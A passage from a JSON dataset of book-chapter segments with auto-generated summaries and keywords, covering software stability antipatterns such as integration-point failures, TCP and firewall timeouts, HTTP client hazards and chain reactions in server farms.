within application code, in calls between systems, or any place a resource has multiple consumers.\n\nIn the next chapter, we’ll look at some patterns that can alleviate or prevent the antipatterns from harming your system. Before we can get to that good news, though, we need to understand what we’re up against.\n\nIn this chapter, we’ll look at antipatterns that can wreck your system. These are common forces that have contributed to more than one system failure. Each of these antipatterns will create, accelerate, or multiply cracks in the system. These bad behaviors are to be avoided.\n\nreport erratum • discuss",
      "page_number": 35,
      "chapter_number": 5,
      "summary": "This chapter covers segment 5 (pages 35-42). Key topics include failures, stabilize, and stability.",
      "keywords": [
        "System",
        "Failure",
        "Failure Modes",
        "crack",
        "time",
        "n’t",
        "stability",
        "report erratum",
        "errors",
        "Stabilize Your System",
        "happen",
        "transaction",
        "patterns",
        "discuss",
        "erratum"
      ],
      "concepts": [
        "failures",
        "stabilize",
        "stability",
        "errors",
        "called",
        "cracks",
        "service",
        "problem",
        "transaction",
        "transactions"
      ],
      "similar_chapters": [
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 31,
          "title": "Segment 31 (pages 265-272)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 55,
          "title": "Segment 55 (pages 546-554)",
          "relevance_score": 0.59,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 40,
          "title": "Segment 40 (pages 399-406)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 29,
          "title": "Segment 29 (pages 272-282)",
          "relevance_score": 0.56,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 23,
          "title": "Segment 23 (pages 213-220)",
          "relevance_score": 0.56,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 6,
      "title": "Segment 6 (pages 43-50)",
      "start_page": 43,
      "end_page": 50,
      "detection_method": "topic_boundary",
      "content": "Integration Points • 33\n\nSimply avoiding these antipatterns isn’t sufficient, though. Everything breaks. Faults are unavoidable. Don’t pretend you can eliminate every possible source of them, because either nature or nurture will create bigger disasters to wreck your systems. Assume the worst. Faults will happen. We need to examine what happens after the fault creeps in.\n\nIntegration Points\n\nI haven’t seen a straight-up “website” project since about 1996. Everything is an integration project with some combination of HTML veneer, front-end app, API, mobile app, or all of the above. The context diagram for these projects will fall into one of two patterns: the butterfly or the spider. A butterfly has a central system with a lot of feeds and connections fanning into it on one side and a large fan out on the other side, as shown in the figure that follows.\n\nUserRole\n\nDownstream\n\nSystemBoundary\n\nProvider\n\nProvider\n\nProvider\n\nCaller\n\nCaller\n\nDownstream\n\nUserRole\n\nCaller\n\nSome people would call this a monolith, but that has negative connotations. It might be a nicely factored system that just has a lot of responsibility.\n\nThe other style is the spiderweb, with many boxes and dependencies. If you’ve been diligent (and maybe a bit lucky), the boxes fall into ranks with calls through tiers, as shown in the first figure on page 34. If not, then the web will be chaotic like that of the black widow, shown in the second figure on page 34. The feature common to all of these is that the connections outnumber the services. A butterfly style has 2N connections, a spiderweb might have up to\n\n2N\n\n, and yours falls somewhere in between.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 34\n\nSvc\n\nSvc\n\nSvc\n\nUserRole\n\nUserRole\n\nCaller\n\nCaller\n\nCaller\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nUpstream\n\nDownstream\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nUserRole\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nUserRole\n\nAll these connections are integration points, and every single one of them is out to destroy your system. In fact, the more we move toward a large number of smaller services, the more we integrate with SaaS providers, and the more we go API first, the worse this is going to get.\n\nreport erratum • discuss\n\nIntegration Points • 35\n\nYou Have How Many Feeds?\n\nI was helping launch a replatform/rearchitecture project for a huge retailer. It came time to identify all the production firewall rules so we could open holes in the firewall to allow authorized connections to the production system. We had already gone through the usual suspects: the web servers’ connections to the application server, the application server to the database server, the cluster manager to the cluster nodes, and so on.\n\nWhen it came time to add rules for the feeds in and out of the production environment, we were pointed toward the project manager for enterprise integration. That’s right, the site rebuild project had its own project manager dedicated just to integration. That was our second clue that this was not going to be a simple task. (The first clue was that nobody else could tell us what all the feeds were.) The project manager understood exactly what we needed. He pulled up his database of integrations and ran a custom report to give us the connection specifics.\n\nFeeds came in from inventory, pricing, content management, CRM, ERP, MRP, SAP, WAP, BAP, BPO, R2D2, and C3P0. Data extracts flew off toward CRM, fulfillment, booking, authorization, fraud checking, address normalization, scheduling, shipping, and so on.\n\nOn the one hand, I was impressed that the project manager had a fully populated database to keep track of the various feeds (synchronous/asynchronous, batch or trickle feed, source system, frequency, volume, cross-reference numbers, business stakeholder, and so on). On the other hand, I was dismayed that he needed a database to keep track of it!\n\nIt probably comes as no surprise, then, that the site was plagued with stability problems when it launched. It was like having a newborn baby in the house; I was awakened every night at 3 a.m. for the latest crash or crisis. We kept documenting the spots where the app crashed and feeding them back to the maintenance team for correction. I never kept a tally, but I’m sure that every single synchronous integration point caused at least one outage.\n\nIntegration points are the number-one killer of systems. Every single one of those feeds presents a stability risk. Every socket, process, pipe, or remote procedure call can and will hang. Even database calls can hang, in ways obvious and subtle. Every feed into the system can hang it, crash it, or generate other impulses at the worst possible time. We’ll look at some of the specific ways these integration points can go bad and what you can do about them.\n\nSocket-Based Protocols\n\nMany higher-level integration protocols run over sockets. In fact, pretty much everything except named pipes and shared-memory IPC is socket-based. The\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 36\n\nhigher protocols introduce their own failure modes, but they’re all susceptible to failures at the socket layer.\n\nThe simplest failure mode occurs when the remote system refuses connections. The calling system must deal with connection failures. Usually, this isn’t much of a problem, since everything from C to Java to Elm has clear ways to indicate a connection failure—either an exception in languages that have them or a magic return value in ones that don’t. Because the API makes it clear that connections don’t always work, programmers deal with that case.\n\nOne wrinkle to watch out for, though, is that it can take a long time to discover that you can’t connect. Hang on for a quick dip into the details of TCP/IP networking.\n\nEvery architecture diagram ever drawn has boxes and arrows, similar to the ones in the following figure. (A new architect will focus on the boxes; an experienced one is more interested in the arrows.)\n\nRemote Server\n\nLocal Server\n\nCaller\n\nProvider\n\nLike a lot of other things we work with, this arrow is an abstraction for a network connection. Really, though, that means it’s an abstraction for an abstraction. A network “connection” is a logical construct—an abstraction—in its own right. All you will ever see on the network itself are packets. (Of course, a “packet” is an abstraction, too. On the wire, it’s just electrons or photons. Between electrons and a TCP connection are many layers of abstraction. Fortunately, we get to choose whichever level of abstraction is useful at any given point in time.) These packets are the Internet Protocol (IP) part of TCP/IP. Transmission Control Protocol (TCP) is an agreement about how to make something that looks like a continuous connection out of discrete packets. The figure on page 37 shows the “three-way handshake” that TCP defines to open a connection.\n\nThe connection starts when the caller (the client in this scenario, even though it is itself a server for other applications) sends a SYN packet to a port on the remote server. If nobody is listening to that port, the remote server immedi- ately sends back a TCP “reset” packet to indicate that nobody’s home. The calling application then gets an exception or a bad return value. All this\n\nreport erratum • discuss\n\nIntegration Points • 37\n\nRemote Server\n\nLocal Server\n\nProvidingService\n\n2. SYN/ACK CallingService1. SYN\n\n3. ACK time\n\nhappens very quickly, in less than ten milliseconds if both machines are plugged into the same switch.\n\nIf an application is listening to the destination port, then the remote server sends back a SYN/ACK packet indicating its willingness to accept the connec- tion. The caller gets the SYN/ACK and sends back its own ACK. These three packets have now established the “connection,” and the applications can send data back and forth. (For what it’s worth, TCP also defines the “simultaneous open” handshake, in which both machines send SYN packets to each other before a SYN/ACK. This is relatively rare in systems that are based on client/server interactions.)\n\nSuppose, though, that the remote application is listening to the port but is absolutely hammered with connection requests, until it can no longer service the incoming connections. The port itself has a “listen queue” that defines how many pending connections (SYN sent, but no SYN/ACK replied) are allowed by the network stack. Once that listen queue is full, further connection attempts are refused quickly. The listen queue is the worst place to be. While the socket is in that partially formed state, whichever thread called open() is blocked inside the OS kernel until the remote application finally gets around to accepting the connection or until the connection attempt times out. Con- nection timeouts vary from one operating system to another, but they’re usually measured in minutes! The calling application’s thread could be blocked waiting for the remote server to respond for ten minutes!\n\nNearly the same thing happens when the caller can connect and send its request but the server takes a long time to read the request and send a response. The read() call will just block until the server gets around to responding. Often, the default is to block forever. You have to set the socket timeout if you want to break out of the blocking call. In that case, be prepared for an exception when the timeout occurs.\n\nNetwork failures can hit you in two ways: fast or slow. Fast network failures cause immediate exceptions in the calling code. “Connection refused” is a very\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 38\n\nfast failure; it takes a few milliseconds to come back to the caller. Slow failures, such as a dropped ACK, let threads block for minutes before throwing exceptions. The blocked thread can’t process other transactions, so overall capacity is reduced. If all threads end up getting blocked, then for all practical purposes, the server is down. Clearly, a slow response is a lot worse than no response.\n\nThe 5 A.M. Problem\n\nOne of the sites I launched developed a nasty pattern of hanging completely at almost exactly 5 a.m. every day. The site was running on around thirty different instances, so something was happening to make all thirty different application server instances hang within a five-minute window (the resolution of our URL pinger). Restarting the application servers always cleared it up, so there was some transient effect that tipped the site over at that time. Unfortunately, that was just when traffic started to ramp up for the day. From midnight to 5 a.m., only about 100 transactions per hour were of interest, but the numbers ramped up quickly once the East Coast started to come online (one hour ahead of us central time folks). Restarting all the application servers just as people started to hit the site in earnest was what you’d call a suboptimal approach.\n\nOn the third day that this occurred, I took thread dumps from one of the afflicted application servers. The instance was up and running, but all request- handling threads were blocked inside the Oracle JDBC library, specifically inside of OCI calls. (We were using the thick-client driver for its superior failover features.) In fact, once I eliminated the threads that were just blocked trying to enter a synchronized method, it looked as if the active threads were all in low-level socket read or write calls.\n\nPacket Capture\n\nAbstractions provide great conciseness of expression. We can go much faster when we talk about fetching a document from a URL than if we have to discuss the tedious details of connection setup, packet framing, acknowledgments, receive windows, and so on. With every abstraction, however, the time comes when you must peel the onion, shed some tears, and see what’s really going on—usually when something is going wrong. Whether for a problem diagnosis or performance tuning, packet capture tools are the only way to understand what’s really happening on the network.\n\ntcpdump is a common UNIX tool for capturing packets from a network interface. Running it in “promiscuous” mode instructs the network interface card (NIC) to receive all packets that cross its wire—even those addressed to other computers. Wireshark can sniff packets on the wire,a as tcpdump does, but it can also show the packets’ structure in a GUI.\n\nreport erratum • discuss\n\nIntegration Points • 39\n\nWireshark runs on the X Window System. It requires a bunch of libraries that might not even be installed in a Docker container or an AWS instance. So it’s best to capture packets noninteractively using tcpdump and then move the capture file to a nonproduc- tion environment for analysis.\n\nThe following screenshot shows Wireshark (then called “Ethereal”) analyzing a capture from my home network. The first packet shows an address routing protocol (ARP) request. This happens to be a question from my wireless bridge to my cable modem. The next packet was a surprise: an HTTP query to Google, asking for a URL called /safebrowsing/lookup with some query parameters. The next two packets show a DNS query and response for the “michaelnygard.dyndns.org” hostname. Packets 5, 6, and 7 are the three-phase handshake for a TCP connection setup. We can trace the entire conversation between my web browser and server. Note that the pane below the packet trace shows the layers of encapsulation that the TCP/IP stack created around the HTTP request in the second packet. The outermost frame is an Ethernet packet. The Ethernet packet contains an IP packet, which in turn contains a TCP packet. Finally, the payload of the TCP packet is an HTTP request. The exact bytes of the entire packet appear in the third pane.\n\nRunning packet traces is an educational activity. I strongly recommend it, but I must offer two comments. First, don’t do it on a network unless you are specifically granted permission! Second, keep a copy of The TCP/IP Guide [Koz05] or TCP/IP Illustrated [Ste93] open beside you.\n\na.\n\nwww.wireshark.org\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 40\n\nThe next step was tcpdump and ethereal (now called Wireshark). The odd thing was how little that showed. A handful of packets were being sent from the application servers to the database servers, but with no replies. Also, nothing was coming from the database to the application servers. Yet monitoring showed that the database was alive and healthy. There were no blocking locks, the run queue was at zero, and the I/O rates were trivial.\n\nBy this time, we had to restart the application servers. Our first priority was restoring service. (We do data collection when we can, but not at the risk of breaking an SLA.) Any deeper investigation would have to wait until the issue happened again. None of us doubted that it would happen again.\n\nSure enough, the pattern repeated itself the next morning. Application servers locked up tight as a drum, with the threads inside the JDBC driver. This time, I was able to look at traffic on the databases’ network. Zilch. Nothing at all. The utter absence of traffic on that side of the firewall was like Sherlock Holmes’ dog that didn’t bark in the night—the absence of activity was the biggest clue. I had a hypothesis. Quick decompilation of the application server’s resource pool class confirmed that my hypothesis was plausible.\n\nI said before that socket connections are an abstraction. They exist only as objects in the memory of the computers at the endpoints. Once established, a TCP connection can exist for days without a single packet being sent by either side. As long as both computers have that socket state in memory, the “connection” is still valid. Routes can change, and physical links can be sev- ered and reconnected. It doesn’t matter; the “connection” persists as long as the two computers at the endpoints think it does.\n\nIn the innocent days of DARPAnet and EDUnet, that all worked beautifully well. Pretty soon after AOL connected to the Internet, though, we discovered the need for firewalls. Such paranoid little bastions have broken the philosophy and implementation of the whole Net.\n\nA firewall is nothing but a specialized router. It routes packets from one set of physical ports to another. Inside each firewall, a set of access control lists define the rules about which connections it will allow. The rules say such things as “connections originating from 192.0.2.0/24 to 192.168.1.199 port 80 are allowed.” When the firewall sees an incoming SYN packet, it checks it against its rule base. The packet might be allowed (routed to the destination network), rejected (TCP reset packet sent back to origin), or ignored (dropped on the floor with no response at all). If the connection is allowed, then the firewall makes an entry in its own internal table that says something like “192.0.2.98:32770 is connected to 192.168.1.199:80.” Then all future packets,\n\nreport erratum • discuss",
      "page_number": 43,
      "chapter_number": 6,
      "summary": "This chapter covers segment 6 (pages 43-50). Key topics include connections, connection, and connect. They meant that demand for new software outstripped the capacity of all existing programmers worldwide.",
      "keywords": [
        "Svc",
        "NATO Software Engineering",
        "system",
        "Stability Antipatterns Delegates",
        "server",
        "connection",
        "NATO Software",
        "Remote Server",
        "Integration Points",
        "Antipatterns Delegates"
      ],
      "concepts": [
        "connections",
        "connection",
        "connect",
        "servers",
        "times",
        "packets",
        "failures",
        "systems",
        "application",
        "applications"
      ],
      "similar_chapters": [
        {
          "book": "Software Architecture",
          "chapter": 17,
          "title": "Segment 17 (pages 156-163)",
          "relevance_score": 0.55,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 3",
          "chapter": 54,
          "title": "Segment 54 (pages 513-523)",
          "relevance_score": 0.52,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 8",
          "chapter": 47,
          "title": "Segment 47 (pages 448-460)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice Architecture",
          "chapter": 9,
          "title": "Segment 9 (pages 66-73)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 43,
          "title": "Segment 43 (pages 433-447)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 7,
      "title": "Segment 7 (pages 51-58)",
      "start_page": 51,
      "end_page": 58,
      "detection_method": "topic_boundary",
      "content": "Integration Points • 41\n\nin either direction, that match the endpoints of the connection are routed between the firewall’s networks.\n\nSo far, so good. How is this related to my 5 a.m. wake-up calls?\n\nThe key is that table of established connections inside the firewall. It’s finite. Therefore, it does not allow infinite duration connections, even though TCP itself does allow them. Along with the endpoints of the connection, the firewall also keeps a “last packet” time. If too much time elapses without a packet on a connection, the firewall assumes that the endpoints are dead or gone. It just drops the connection from its table, as shown in the following figure. But TCP was never designed for that kind of intelligent device in the middle of a connec- tion. There’s no way for a third party to tell the endpoints that their connection is being torn down. The endpoints assume their connection is valid for an indefinite length of time, even if no packets are crossing the wire.\n\n4. SYN/ACK\n\nRemote Server\n\n8. data/ACK1. SYN\n\n5. ACK time\n\n2. SYN\n\n6. ACK\n\n7. data\n\n9. data/ACK1 hour idle time\n\n10. dataidle time Firewallcheck rulesetforget conndrop packet on ﬂoor\n\n3. SYN/ACK\n\nAs a router, the firewall could have sent an ICMP reset to indicate the route no longer works. However, it could also have been configured to suppress that kind of ICMP traffic, since those can also be used as network probes by the bad guys. Even though this was an interior firewall, it was configured under the assumption that outer tiers would be compromised. So it dropped those packets instead of informing the sender that the destination host couldn’t be reached.\n\nAfter that point, any attempt to read or write from the socket on either end did not result in a TCP reset or an error due to a half-open socket. Instead, the TCP/IP stack sent the packet, waited for an ACK, didn’t get one, and retransmitted. The faithful stack tried and tried to reestablish contact, and that firewall just kept dropping the packets on the floor, without so much as an “ICMP destination unreachable” message. My Linux system, running on\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 42\n\na 2.6 series kernel, has its tcp_retries2 set to the default value of 15, which results in a twenty-minute timeout before the TCP/IP stack will inform the socket library that the connection is broken. The HP-UX servers we were using at the time had a thirty-minute timeout. That application’s one-line call to write to a socket could block for thirty minutes! The situation for reading from the socket was even worse. It could block forever.\n\nWhen I decompiled the resource pool class, I saw that it used a last-in, first-out strategy. During the slow overnight times, traffic volume was light enough that a single database connection would get checked out of the pool, used, and checked back in. Then the next request would get the same connection, leaving the thirty-nine others to sit idle until traffic started to ramp up. They were idle well over the one-hour idle connection timeout configured into the firewall.\n\nOnce traffic started to ramp up, those thirty-nine connections per application server would get locked up immediately. Even if the one connection was still being used to serve pages, sooner or later it would be checked out by a thread that ended up blocked on a connection from one of the other pools. Then the one good connection would be held by a blocked thread. Total site hang.\n\nOnce we understood all the links in that chain of failure, we had to find a solution. The resource pool has the ability to test JDBC connections for validity before checking them out. It checked validity by executing a SQL query like “SELECT SYSDATE FROM DUAL.” Well, that would’ve just make the request-handling thread hang anyway. We could also have had the pool keep track of the idle time of the JDBC connection and discard any that were older than one hour. Unfortunately, that strategy involves sending a packet to the database server to tell it that the session is being torn down. Hang.\n\nWe were starting to look at some really hairy complexities, such as creating a “reaper” thread to find connections that were close to getting too old and tearing them down before they timed out. Fortunately, a sharp DBA recalled just the thing. Oracle has a feature called dead connection detection that you can enable to discover when clients have crashed. When enabled, the database server sends a ping packet to the client at some periodic interval. If the client responds, then the database knows it’s still alive. If the client fails to respond after a few retries, the database server assumes the client has crashed and frees up all the resources held by that connection.\n\nWe weren’t that worried about the client crashing. The ping packet itself, however, was what we needed to reset the firewall’s “last packet” time for the connection, keeping the connection alive. Dead connection detection kept the connection alive, which let me sleep through the night.\n\nreport erratum • discuss\n\nIntegration Points • 43\n\nThe main lesson here is that not every problem can be solved at the level of abstraction where it manifests. Sometimes the causes reverberate up and down the layers. You need to know how to drill through at least two layers of abstraction to find the “reality” at that level in order to understand problems.\n\nNext, let’s look at problems with HTTP-based protocols.\n\nHTTP Protocols\n\nREST with JSON over HTTP is the lingua franca for services today. No matter what language or framework you use, it boils down to shipping some chunk of formatted, semantically meaningful text as an HTTP request and waiting for an HTTP response.\n\nOf course, all HTTP-based protocols use sockets, so they are vulnerable to all of the problems described previously. HTTP adds its own set of issues, mainly centered around the various client libraries. Let’s consider some of the ways that such an integration point can harm the caller:\n\nThe provider may accept the TCP connection but never respond to the\n\nHTTP request.\n\nThe provider may accept the connection but not read the request. If the request body is large, it might fill up the provider’s TCP window. That causes the caller’s TCP buffers to fill, which will cause the socket write to block. In this case, even sending the request will never finish.\n\nThe provider may send back a response status the caller doesn’t know how to handle. Like “418 I’m a teapot.” Or more likely, “451 Resource censored.”\n\nThe provider may send back a response with a content type the caller doesn’t expect or know how to handle, such as a generic web server 404 page in HTML instead of a JSON response. (In an especially pernicious example, your ISP may inject an HTML page when your DNS lookup fails.)\n\nThe provider may claim to be sending JSON but actually sending plain\n\ntext. Or kernel binaries. Or Weird Al Yankovic MP3s.\n\nUse a client library that allows fine-grained control over timeouts—including both the connection timeout and read timeout—and response handling. I recommend you avoid client libraries that try to map responses directly into domain objects. Instead, treat a response as data until you’ve confirmed it meets your expectations. It’s just text in maps (also known as dictionaries) and lists until you decide what to extract. We’ll revisit this theme in Chapter 11, Security, on page 215.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 44\n\nVendor API Libraries\n\nIt would be nice to think that enterprise software vendors must have hardened their software against bugs, just because they’ve sold it and deployed it for lots of clients. That might be true of the server software they sell, but it’s rarely true for their client libraries. Usually, software vendors provide client API libraries that have a lot of problems and often have stability risks. These libraries are just code coming from regular developers. They have all the variability in quality, style, and safety that you see from any other random sampling of code.\n\nThe worst part about these libraries is that you have so little control over them. If the vendor doesn’t publish source to its client library, then the best you can hope for is to decompile the code—if you’re in a language where that’s even possible—find issues, and report them as bugs. If you have enough clout to apply pressure to the vendor, then you might be able to get a bug fix to its client library, assuming, of course, that you are on the latest version of the vendor’s software. I have been known to fix a vendor’s bugs and recompile my own version for temporary use while waiting for the official patched version.\n\nThe prime stability killer with vendor API libraries is all about blocking. Whether it’s an internal resource pool, socket read calls, HTTP connections, or just plain old Java serialization, vendor API libraries are peppered with unsafe coding practices.\n\nHere’s a classic example. Whenever you have threads that need to synchronize on multiple resources, you have the potential for deadlock. Thread 1 holds lock A and needs lock B, while thread 2 has lock B and needs lock A. The classic recipe for avoiding this deadlock is to make sure you always acquire the locks in the same order and release them in the reverse order. Of course, this helps only if you know that the thread will be acquiring both locks and you can control the order in which they are acquired. Let’s take an example in Java. This illustration could be from some kind of message-oriented mid- dleware library:\n\nstability_anti_patterns/UserCallback.java public interface UserCallback {\n\npublic void messageReceived(Message msg);\n\n}\n\nstability_anti_patterns/Connection.java public interface Connection {\n\npublic void registerCallback(UserCallback callback);\n\npublic void send(Message msg);\n\n}\n\nreport erratum • discuss\n\nIntegration Points • 45\n\nI’m sure this looks quite familiar. Is it safe? I have no idea.\n\nWe can’t tell what the execution context will be just by looking at the code. You have to know what thread messageReceived() gets called on, or else you can’t be sure what locks the thread will already hold. It could have a dozen synchro- nized methods on the stack already. Deadlock minefield.\n\nIn fact, even though the UserCallback interface does not declare messageReceived() as synchronized (you can’t declare an interface method as synchronized), the implementation might make it synchronized. Depending on the threading model inside the client library and how long your callback method takes, synchronizing the callback method could block threads inside the client library. Like a plugged drain, those blocked threads can cause threads calling send() to block. Odds are that means request-handling threads will be tied up. As always, once all the request-handling threads are blocked, your application might as well be down.\n\nCountering Integration Point Problems\n\nA stand-alone system that doesn’t integrate with anything is rare, not to mention being almost useless. What can you do to make integration points safer? The most effective stability patterns to combat integration point failures are Circuit Breaker on page 95 and Decoupling Middleware on page 117.\n\nTesting helps, too. Cynical software should handle violations of form and function, such as badly formed headers or abruptly closed connections. To make sure your software is cynical enough, you should make a test harness —a simulator that provides controllable behavior—for each integration test. (See Test Harnesses, on page 113.) Setting the test harness to spit back canned responses facilitates functional testing. It also provides isolation from the target system when you’re testing. Finally, each such test harness should also allow you to simulate various kinds of system and network failures.\n\nThis test harness will immediately help with functional testing. To test for stability, you also need to flip all the switches on the harness while the system is under considerable load. This load can come from a bunch of workstations or cloud instances, but it definitely requires much more than a handful of testers clicking around on their desktops.\n\nRemember This\n\nBeware this necessary evil.\n\nEvery integration point will eventually fail in some way, and you need to be prepared for that failure.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 46\n\nPrepare for the many forms of failure.\n\nIntegration point failures take several forms, ranging from various network errors to semantic errors. You will not get nice error responses delivered through the defined protocol; instead, you’ll see some kind of protocol violation, slow response, or outright hang.\n\nKnow when to open up abstractions.\n\nDebugging integration point failures usually requires peeling back a layer of abstraction. Failures are often difficult to debug at the application layer because most of them violate the high-level protocols. Packet sniffers and other network diagnostics can help.\n\nFailures propagate quickly.\n\nFailure in a remote system quickly becomes your problem, usually as a cascading failure when your code isn’t defensive enough.\n\nApply patterns to avert integration point problems.\n\nDefensive programming via Circuit Breaker, Timeouts (see Timeouts, on page 91), Decoupling Middleware, and Handshaking (see Handshaking, on page 111) will all help you avoid the dangers of integration points.\n\nChain Reactions\n\nThe dominant architectural style today is the horizontally scaled farm of commodity hardware. Horizontal scaling means we add capacity by adding more servers. We sometimes call these “farms.” The alternative, vertical scaling, means building bigger and bigger servers—adding core, memory, and storage to hosts. Vertical scaling has its place, but most of our interactive workload goes to horizontally scaled farms.\n\nIf your system scales horizontally, then you will have load-balanced farms or clusters where each server runs the same applications. The multiplicity of machines provides you with fault tolerance through redundancy. A single machine or process can completely bonk while the remainder continues serving transactions.\n\nStill, even though horizontal clusters are not susceptible to single points of failure (except in the case of attacks of self-denial; see Self-Denial Attacks, on page 69), they can exhibit a load-related failure mode. For example, a concur- rency bug that causes a race condition shows up more often under high load than low load. When one node in a load-balanced group fails, the other nodes must pick up the slack. For example, in the eight-server farm shown in the figure on page 47, each node handles 12.5 percent of the total load.\n\nreport erratum • discuss\n\nChain Reactions • 47\n\nServer 812.5%\n\nLoad Balancer / Cluster Manager\n\nServer 112.5%\n\nServer 212.5%\n\nServer 312.5%\n\nServer 412.5%\n\nServer 512.5%\n\nClients\n\nServer 612.5%\n\nServer 712.5%\n\nAfter one server pops off, you have the distribution shown in the following figure. Each of the remaining seven servers must handle about 14.3 percent of the total load. Even though each server has to take only 1.8 percent more of the total workload, that server’s load increases by about 15 percent. In the degenerate case of a failure in a two-node cluster, the survivor’s workload doubles. It has its original load (50 percent of the total) plus the dead node’s load (50 percent of the total).\n\nServer 80.00%\n\nServer 114.3%\n\nServer 214.3%\n\nServer 314.3%\n\nServer 414.3%\n\nServer 514.3%\n\nClients\n\nServer 614.3%\n\nServer 714.3%\n\nLoad Balancer / Cluster Manager\n\nIf the first server failed because of some load-related condition, such as a memory leak or intermittent race condition, the surviving nodes become more likely to fail. With each additional server that goes dark, the remaining stalwarts get more and more burdened and therefore are more and more likely to also go dark.\n\nA chain reaction occurs when an application has some defect—usually a resource leak or a load-related crash. We’re already talking about a homoge- neous layer, so that defect is going to be in each of the servers. That means the only way you can eliminate the chain reaction is to fix the underlying defect. Splitting a layer into multiple pools—as in the Bulkhead pattern on page 98—can sometimes help by splitting a single chain reaction into two separate chain reactions that occur at different rates.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 48\n\nWhat effect could a chain reaction have on the rest of the system? Well, for one thing, a chain reaction failure in one layer can easily lead to a cascading failure in a calling layer.\n\nChain reactions are sometimes caused by blocked threads. This happens when all the request-handling threads in an application get blocked and that applica- tion stops responding. Incoming requests will get distributed out to the applica- tions on other servers in the same layer, increasing their chance of failure.\n\nSearching...\n\nI was dealing with a retailer’s primary online brand. It had a huge catalog—half a million SKUs in 100 different categories. For that brand, search wasn’t just helpful; it was necessary. A dozen search engines sitting behind a hardware load balancer handled holiday traffic. The application servers would connect to a virtual IP address instead of specific search engines (see Migratory Virtual IP Addresses, on page 189, for more about load balancing and virtual IP addresses). The load balancer then distribut- ed the application servers’ queries out to the search engines. The load balancer also performed health checks to discover which servers were alive and responsive so it could make sure to send queries only to search engines that were alive.\n\nThose health checks turned out to be useful. The search engine had some bug that caused a memory leak. Under regular traffic (not a holiday season), the search engines would start to go dark right around noon. Because each engine had been taking the same proportion of load throughout the morning, they would all crash at about the same time. As each search engine went dark, the load balancer would send their share of the queries to the remaining servers, causing them to run out of memory even faster. When I looked at a chart of their “last response” timestamps, I could very clearly see an accelerating pattern of crashes. The gap between the first crash and the second would be five or six minutes. Between the second and third would be just three or four minutes. The last two would go down within seconds of each other.\n\nThis particular system also suffered from cascading failures and blocked threads. Losing the last search server caused the entire front end to lock up completely.\n\nUntil we got an effective patch from the vendor (which took months), we had to follow a daily regime of restarts that bracketed the peak hours: 11 a.m., 4 p.m., and 9 p.m.\n\nRemember This\n\nRecognize that one server down jeopardizes the rest.\n\nA chain reaction happens because the death of one server makes the others pick up the slack. The increased load makes them more likely to fail. A chain reaction will quickly bring an entire layer down. Other layers that depend on it must protect themselves, or they will go down in a cas- cading failure.\n\nreport erratum • discuss",
      "page_number": 51,
      "chapter_number": 7,
      "summary": "This chapter covers segment 7 (pages 51-58). Key topics include packets, connected, and server.",
      "keywords": [
        "connection",
        "packet",
        "TCP",
        "TCP connection",
        "integration point",
        "TCP packet",
        "integration point failures",
        "firewall",
        "client",
        "Integration",
        "n’t",
        "server",
        "HTTP request",
        "TCP reset packet",
        "point"
      ],
      "concepts": [
        "packets",
        "connected",
        "server",
        "threads",
        "failure",
        "response",
        "called",
        "protocols",
        "network",
        "integration"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 32,
          "title": "Segment 32 (pages 299-308)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 3",
          "chapter": 50,
          "title": "Segment 50 (pages 477-487)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 33,
          "title": "Segment 33 (pages 309-318)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 7",
          "chapter": 54,
          "title": "Segment 54 (pages 522-529)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 3",
          "chapter": 56,
          "title": "Segment 56 (pages 532-540)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 8,
      "title": "Segment 8 (pages 59-66)",
      "start_page": 59,
      "end_page": 66,
      "detection_method": "topic_boundary",
